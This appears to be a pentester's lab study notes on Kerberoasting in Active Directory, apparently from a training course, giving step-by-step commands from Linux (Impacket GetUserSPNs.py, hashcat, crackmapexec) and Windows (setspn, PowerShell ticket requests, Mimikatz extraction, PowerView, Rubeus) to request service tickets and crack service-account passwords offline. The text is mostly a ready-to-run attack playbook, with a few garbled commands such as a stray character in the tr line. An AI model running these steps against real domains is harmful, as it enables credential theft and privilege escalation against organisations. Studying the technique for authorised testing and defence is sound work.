--- ---

<h2>Kerberoasting From Linux</h2>

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\LOCAL SERVICE. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

Performing the Attack:
- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using runas /netonly.

Tools Used:
- Impacket’s GetUserSPNs.py from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts.

Steps:
1. List SPN Accounts with GetUserSPNs.py
```
GetUserSPNs.py -dc-ip 172.16.5.5 DOMAIN.LOCAL/forend
```

2. Pull down all the TGS tickets for offline cracking using -request flag:
```
GetUserSPNs.py -dc-ip 172.16.5.5 DOMAIN.LOCAL/forend -request
```

3. You can also target one specific account (sqldev in this example):
```
GetUserSPNs.py -dc-ip 172.16.5.5 DOMAIN.LOCAL/forend -request -user XXX
```

4. For offline cracking, it's good to add -outputfile at the end:
```
GetUserSPNs.py -dc-ip 172.16.5.5 DOMAIN.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

5. Crack the ticket with hashcat:
```
hashcat -m 13100 <file_name> /usr/share/wordlists/rockyou.txt
```

6. Test authentication against the Domain Controller:
```
sudo crackmapexec smb <ip_of_dc> -u <user> -p <password>
```

---

<h2>Kerberoasting From Windows</h2>

Manual Method:
1. Run this command with "setspn.exe"
```
setspn.exe -Q */*
```
	- Focus on User Accounts (not computer accounts)

2. Use Powershell to request TGS ticket for a single user to be stored in memory
```
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object
System.IdentityModel.Tokens.KerberosRequestorSecurityToken -
ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

- The Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
- The -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using
- System.IdentityModel is a namespace that contains different classes for building security token services
- We'll then use the New-Object cmdlet to create an instance of a .NET Framework object
- We'll use the System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

3. Use Mimikatz to extract the ticket from memory
![[Pasted image 20221225214355.png]]
If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files. Depending on our position on the
network and if we can easily move files to our attack host, this can be
easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.

4. Remove new lines and white spaces
```
echo "<base64 blob>" | tr -d \\n5
```

5. Convert file back to .kirbi
```
cat encoded_file | base64 -d > sqldev.kirbi
```

6. Using this version of kirbi2john.py , extract the Kerberos ticket
```
python2.7 kirbi2john.py sqldev.kirbi
```

7. Modify the crack_file for Hashcat
```
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

8. Crack the hash with hashcat
```
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```


---> Automated/Tool Based Route

PowerView
1. Use PowerView to Extract TGS Tickets
```
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
```
	- From here, we can target a specific user

2. Using PowerView to Target a Specific User
```
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

3. Export all tickets to a CSV File for offline processing
```
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```


Rubeus
Things Rubeus can do:
- Performing Kerberoasting and outputting hashes to a file
- Using alternate credentials
- Performing Kerberoasting combined with a pass-the-ticket attack
- Performing "opsec" Kerberoasting to filter out AES-enabled accounts
- Requesting tickets for accounts passwords set between a specific date range
- Placing a limit on the number of tickets requested
- Performing AES Kerberoasting

1. Gather stats
```
.\Rubeus.exe kerberoast /stats
```

2. Specify admin acounts (and use nowrap to make it easier to crack)
```
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
